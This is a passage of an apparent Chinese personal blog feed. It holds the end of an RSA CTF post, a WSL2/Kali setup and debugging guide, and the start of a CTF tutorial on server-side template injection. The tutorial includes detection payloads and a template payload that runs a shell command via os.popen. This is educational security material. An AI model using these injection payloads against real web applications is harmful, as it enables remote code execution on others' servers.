punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    get_flag_for&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;#get_flag()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2l1cy9yc2F0b29s&#34;&gt;rsatool&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;[factordb](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mYWN0b3JkYi5jb20=&#34;&gt;http://www.factordb.com &lt;/span&gt;)&lt;/li&gt;
&lt;li&gt;gmpy2/pycrypto 库&lt;/li&gt;
&lt;li&gt;yafu&lt;/li&gt;
&lt;li&gt;openssl&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文章&#34;&gt;#&lt;/a&gt; 参考文章&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjMwMzE2L2FydGljbGUvZGV0YWlscy8xMDU5MDQwMjA=&#34;&gt;个人收集的 RSA 常用脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vUDIwMTUyMTQ0MDAwMS9wLzExNDM5MzQ0Lmh0bWw=&#34;&gt;常见的 RSA 套路脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlcmVuZGlwaXR5MTEzMC9hcnRpY2xlL2RldGFpbHMvMTIwMTU0NTM0&#34;&gt;共模攻击原理详解&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc5MDc3OS9hcnRpY2xlL2RldGFpbHMvMTA4NDczOTg0P3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjEmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUNUUkxJU1QlN0VkZWZhdWx0LTEubm9fc2VhcmNoX2xpbmsmYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMS5ub19zZWFyY2hfbGluaw==&#34;&gt;gmpy2 常见函数使用&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="业余爱好" />
        <updated>2021-11-30T09:28:09.178Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/</id>
        <title>wsl2安装使用及debug心得</title>
        <link rel="alternate" href="http://imfanqie.top/2021/11/28/debug/wsl2%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E5%8F%8Adebug%E5%BF%83%E5%BE%97/"/>
        <content type="html">&lt;p&gt;分享一下我对 wsl2 的看法及使用心得，顺便记录在安装 wsl2 时我的心路历程&lt;/p&gt;
&lt;p&gt;(遇到的问题及解决方法)&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;为什么选择wsl2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么选择wsl2&#34;&gt;#&lt;/a&gt; 为什么选择 WSL2?&lt;/h1&gt;
&lt;p&gt;很多人接触到 &lt;code&gt;wsl&lt;/code&gt;  时都有一种陌生感和抵触感，因为我们常常会选择 &lt;code&gt;VM&lt;/code&gt; ，认为老牌产品更靠谱。&lt;/p&gt;
&lt;p&gt;的确，但是随着系统的发展，我们去不断尝试和接触新的产品，其实也未尝不是一件好事，正比如今天说的 &lt;code&gt;wsl&lt;/code&gt; ，它大大简化了虚拟机安装繁琐的过程，以及每次使用的步骤，大大提高了使用效率，节约了空间，方便转移甚至移植到其他机器，同时 &lt;code&gt;wsl&lt;/code&gt;  有着很高的自主选择权，让用户可以自己定义功能等等，从上面角度来说，我认为是优于传统 &lt;code&gt;VM&lt;/code&gt;  的。&lt;/p&gt;
&lt;p&gt;尽管 &lt;code&gt;wsl&lt;/code&gt;  也有着不少缺点，比如操作容错率小，自定义时想实现更高的功能会稍有复杂，debug 贴少于 &lt;code&gt;VM&lt;/code&gt; （这点劝退了很多人）、或者说很多人入门时装好了 &lt;code&gt;VM&lt;/code&gt;  懒得再折腾等等。&lt;/p&gt;
&lt;p&gt;对于有想法且不嫌麻烦折腾一次的人，我的意见是 wsl 绝对物超所值，配置好后能带来极大的便利，你值得拥有，如果对 &lt;code&gt;wsl&lt;/code&gt;  感兴趣或者有什么疑问，欢迎来评论区交流！&lt;/p&gt;
&lt;p&gt;至于我，为什么选择 &lt;code&gt;wsl&lt;/code&gt; ？恐怕是我没有深度依赖于 &lt;code&gt;VM&lt;/code&gt; ，并且厌倦了繁琐的 &lt;code&gt;VM&lt;/code&gt;  使用方法（其实还好，是我懒），且本人爱折腾。&lt;/p&gt;
&lt;p&gt;万幸的是， &lt;code&gt;wsl&lt;/code&gt;  目前带给了我很好的体验感，并且学到了很多不一样的知识，所以我认为写本帖其实很有意义。&lt;/p&gt;
&lt;h1 id=&#34;kali-wsl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kali-wsl&#34;&gt;#&lt;/a&gt; kali-wsl&lt;/h1&gt;
&lt;p&gt;很多人都刚开始接触 kali-wsl 可能都会发现，这个 kali 非常不完整，很多工具都没有，这是因为这个 kali 并不是完整版的，但其实我们只需一个命令即可让其变成完整版，让其变得可以运行几乎所有的 kali 工具包。&lt;/p&gt;
&lt;p&gt;wsl 安装过程可以参考下面这个帖子，比较靠谱。&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;安装完整kali&lt;/code&gt;  一步时，注意可以选择不同的版本，请根据需求谨慎选择！&lt;/p&gt;
&lt;p&gt;具体参见：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL2thbGktbGludXgvbWV0YXBhY2thZ2VzLmh0bWw=&#34;&gt;Kali Linux 高级教程：元数据包 “工具子集” 介绍与安装&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;值得一提的是，换源的时候不是很好操作，如果要调整光标位置，请先按一下 &lt;code&gt;del&lt;/code&gt; ，再操控方向，否则你试试就懂了，两下 d 删除一行。&lt;/p&gt;
&lt;p&gt;如果能复制尽量复制，打错了或者复制错了如果不会删除建议关掉重开。&lt;/p&gt;
&lt;p&gt;按一下 &lt;code&gt;esc&lt;/code&gt; ，输入 &lt;code&gt;:q&lt;/code&gt;  直接退出， &lt;code&gt;:wq&lt;/code&gt;  保存退出。&lt;/p&gt;
&lt;p&gt;剩下的直接参考 csdn 上面贴子。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMwL2FydGljbGUvZGV0YWlscy8xMDg2NzU5MTU=&#34;&gt;wsl2-kali 基础配置&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重点来了&lt;/strong&gt;，默认的 wsl2 的存储位置在 c 盘，如果分配空间过大或者使用过大的话，很容易导致爆盘，所以建议配置完基础后进行移盘操作，保证好不要出岔子！&lt;/p&gt;
&lt;p&gt;（血泪教训，我就爆过盘！！！）&lt;/p&gt;
&lt;p&gt;操作如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;查看 WSL 分发版本&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 &lt;code&gt;Windows PowerShell&lt;/code&gt;  中输入如下命令:&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wsl &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;l &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;all &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;v&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;导出分发版为 tar 文件到 d 盘&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wsl &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;export kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux d:\kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tar&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;注销当前分发版&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wsl &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;unregister kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;重新导入并安装 WSL 在 d:\kali-linux&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wsl &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;import kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux d:\kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux d:\kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tar &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;version 2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;删除 tar 文件 (不删也行)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;del&lt;/span&gt; d:\kali&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tar&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;wsl-ubuntu 参考下面这篇文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGw1NDI0NzU3MzYvcC8xNDg1NTg2My5odG1s&#34;&gt;WSL 修改默认安装目录到其他盘&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;个人建议早点移盘，不然会后悔的，配置变量多了很麻烦&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;一切安装好后，可以查看目录是否有自己需要的软件，下面附一个软件功能表：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHprYWxpc2x3L3AvMTI4NDU3MTQuaHRtbA==&#34;&gt;kali 各工具使用介绍&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;kali docker 安装&lt;/strong&gt;：由于 kali 佬可能会用到 &lt;code&gt;docker&lt;/code&gt; ，下面加一个靠谱的安装教程，亲测好用：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODMyODM3L2FydGljbGUvZGV0YWlscy8xMDM5NDgzMTQ=&#34;&gt;kali 安装 docker&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其他软件自己搜就好，此时的 kali 与正常的 kali 图像化界面已经大同小异，直接调用命令行就可。&lt;/p&gt;
&lt;h1 id=&#34;kali-快速debug分享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kali-快速debug分享&#34;&gt;#&lt;/a&gt; kali 快速 debug 分享&lt;/h1&gt;
&lt;p&gt;下面分享一下我遇到的 bug 和解决方法，帮助新手减少点难度，其他 bug 可以上百度搜，时至今日基本都能解决（有很多大佬）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 找不到 wsl&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在控制面板 &amp;gt; 程序 &amp;gt; 启动或关闭 &lt;code&gt;Windows&lt;/code&gt;  功能处，打开适用于 &lt;code&gt;Linux&lt;/code&gt;  的 &lt;code&gt;Windows&lt;/code&gt;  子系统功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 参考的对象类型不支持尝试的操作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载此软件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucHJveGlmaWVyLmNvbS90bXAvVGVzdDIwMjAwMjI4L05vTHNwLmV4ZQ==&#34;&gt;www.proxifier.com/tmp/Test20200228/NoLsp.exe&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理员身份运行 CMD 输入：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;NoLsp.exe C:\windows\system32\wsl.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;请自行注意 &lt;code&gt;NoLsp.exe&lt;/code&gt;  程序的位置，以及你的 &lt;code&gt;wsl.exe&lt;/code&gt;  位置。&lt;/p&gt;
&lt;p&gt;方法摘自&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNTEzOTI0MTE=&#34;&gt;参考的对象类型不支持尝试的操作&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 修改数据时出现问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在汉化和换源时出现问题，如果还没保存， &lt;code&gt;esc&lt;/code&gt;  后 &lt;code&gt;:q&lt;/code&gt;  重新进去修改就行&lt;/p&gt;
&lt;p&gt;否则最简单的就是卸载重装（我经历了四次）&lt;/p&gt;
&lt;h1 id=&#34;gui界面安装可选&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gui界面安装可选&#34;&gt;#&lt;/a&gt; GUI 界面安装（可选）&lt;/h1&gt;
&lt;p&gt;其实我是没准备写这方面的，但总是有人嫌没有界面化系统所以觉得 &lt;code&gt;wsl&lt;/code&gt;  不如 &lt;code&gt;VM&lt;/code&gt; ，其实我想说的是：人不行还非要怪路不平～～人家有你也不想装！&lt;/p&gt;
&lt;p&gt;由于本人没有安装 GUI 的需求，个人也认为没必要，实在是没有代码行好用，所以只提供几个帖子，但在我反复比对后，发现其实都大同小异。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2wxNDQ3MzIwMjI5L2FydGljbGUvZGV0YWlscy8xMDgyMTA3NjA/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NjEuMSZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50X3QwLm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMS5ub19zZWFyY2hfbGluayZhbXA7ZGVwdGhfMS11dG1fc291cmNlPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnRfdDAubm9uZS10YXNrLWJsb2ctMiU3RWRlZmF1bHQlN0VDVFJMSVNUJTdFZGVmYXVsdC0xLm5vX3NlYXJjaF9saW5r&#34;&gt;WSL2（win10 子系统）Linux 图形化 GUI 教程 win-kex&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8yOTkzMjYxMy9hcnRpY2xlL2RldGFpbHMvMTE0NDc2MzA1P3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjMmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUNUUkxJU1QlN0VkZWZhdWx0LTMuZXNzZWFyY2hfcGNfcmVsZXZhbnQmYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMy5lc3NlYXJjaF9wY19yZWxldmFudA==&#34;&gt;wsl 使用可视化界面_为 Windows 子系统 Kali-Linux 提供桌面体验 Win-kex 安装说明使用书&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy93c2wvd2luLWtleC8=&#34;&gt;win-hex 官网&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="debug" />
        <updated>2021-11-28T14:55:56.006Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
        <title>ctfweb-SSTI服务器模板注入</title>
        <link rel="alternate" href="http://imfanqie.top/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;p&gt;简单学习了一下 ssti，这方面可以说是很烦了:（&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述&#34;&gt;#&lt;/a&gt; 概述&lt;/h2&gt;
&lt;p&gt;模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在考虑进行模板注入之前，我们需要进行漏洞探测&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;探测漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测漏洞&#34;&gt;#&lt;/a&gt; 探测漏洞&lt;/h2&gt;
&lt;h3 id=&#34;1文本类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1文本类&#34;&gt;#&lt;/a&gt; 1. 文本类&lt;/h3&gt;
&lt;p&gt;大部分的模板语言支持我们输入 HTML，未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。&lt;/p&gt;
&lt;p&gt;例如，考虑一个包含以下易受攻击的代码的模板：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;render(&#39;Hello &#39; + username)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以发送如下 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;7*7&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者通过请求 URL 来测试服务器端模板的注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/?username=$&amp;#123;7*7&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果结果输出包含 &lt;code&gt;Hello 49&lt;/code&gt; ，则表明正在服务器端评估数学运算。这是服务器端模板注入漏洞的良好概念证明。&lt;/p&gt;
&lt;h3 id=&#34;2代码类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2代码类&#34;&gt;#&lt;/a&gt; 2. 代码类&lt;/h3&gt;
&lt;p&gt;在一些环境下，用户的输入也会被当作模板的可执行代码。&lt;/p&gt;
&lt;p&gt;这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的 HTML 标签以确认漏洞：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/?greeting=data.username
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在没有 XSS 的情况下，这通常会导致输出中出现空白条目（只是&lt;strong&gt; Hello&lt;/strong&gt; 没有用户名），编码标签或错误消息。&lt;/p&gt;
&lt;p&gt;下一步是尝试使用通用模板语法突破该语句，并尝试在其后注入任意 HTML：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/?greeting=data.username&amp;#125;&amp;#125;&amp;lt;tag&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果再次导致错误或空白输出，则说明使用了错误的模板语言提供的语法，或者，如果没有模板样式的语法似乎有效，则无法进行服务器端模板注入。&lt;/p&gt;
&lt;p&gt;或者，如果输出和任意 HTML 一起正确呈现，则表明存在服务器端模板注入漏洞：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Hello user01 &amp;lt;tag&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;确认模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#确认模板&#34;&gt;#&lt;/a&gt; 确认模板&lt;/h2&gt;
&lt;p&gt;一旦检测到模板注入潜力，下一步就是确定模板引擎。&lt;/p&gt;
&lt;p&gt;尽管有大量的模板语言，但是其中许多模板使用非常相似的语法，而这些语法是专门为不与 HTML 字符冲突而选择的。&lt;/p&gt;
&lt;p&gt;通常只需提交无效的语法就足够了，因为产生的错误消息将准确告诉您模板引擎是什么，有时甚至是哪个版本。例如，无效表达式 &lt;code&gt;&amp;lt;%=foobar%&amp;gt;&lt;/code&gt;  从基于 Ruby 的 ERB 引擎触发以下响应：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(erb):1:in `&amp;lt;main&amp;gt;&#39;: undefined local variable or method `foobar&#39; for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval&#39;
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result&#39;
from -e:4:in `&amp;lt;main&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;否则，需要手动测试特定于语言的不同有效负载，根据不同的运算值判断模板。常用的方法是使用来自不同模板引擎的语法注入任意数学运算。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这里的绿线表示结果成功返回，红线反之。&lt;/p&gt;
&lt;p&gt;相同的有效负载有时可能会以一种以上的模板语言返回成功的响应。例如有效负载 &lt;code&gt;&amp;#123; &amp;#123;7*&#39;7&#39;&amp;#125; &amp;#125;&lt;/code&gt;  在 Twig 中返回&lt;strong&gt; 49&lt;/strong&gt;，在 Jinja2 中返回&lt;strong&gt; 7777777&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
&lt;h3 id=&#34;1读文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1读文档&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 读文档&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&#39;Template 使用手册 &#39;，这一部分通常告诉我们基本的模板语法&lt;/li&gt;
&lt;li&gt;&#39; 安全问题 &#39;，在攻击模板时，它通常可以提供我们许多思路&lt;/li&gt;
&lt;li&gt;内建方法，函数，变量，过滤器&lt;/li&gt;
&lt;li&gt;插件 / 扩展 —— 我们可以优先研究默认开启的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2探环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2探环境&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 探环境&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数 / 对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。&lt;/p&gt;
&lt;p&gt;如果没有这样的对象或函数，我们需要暴力枚举变量名。&lt;/p&gt;
&lt;p&gt;有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。&lt;/p&gt;
&lt;h3 id=&#34;3黑程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3黑程序&#34;&gt;#&lt;/a&gt; 3.&lt;strong&gt; 黑程序&lt;/strong&gt;&lt;/h3&gt;
&lt;p php&gt;有些时候，攻破一个程序不需要多少时间，比如：{php} echo id;&lt;/p&gt;
&lt;p&gt;这时，我们只需递交：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%
import os
x=os.popen(&#39;id&#39;).read()
%&amp;gt;
$&amp;#123;x&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即可&lt;/p&gt;
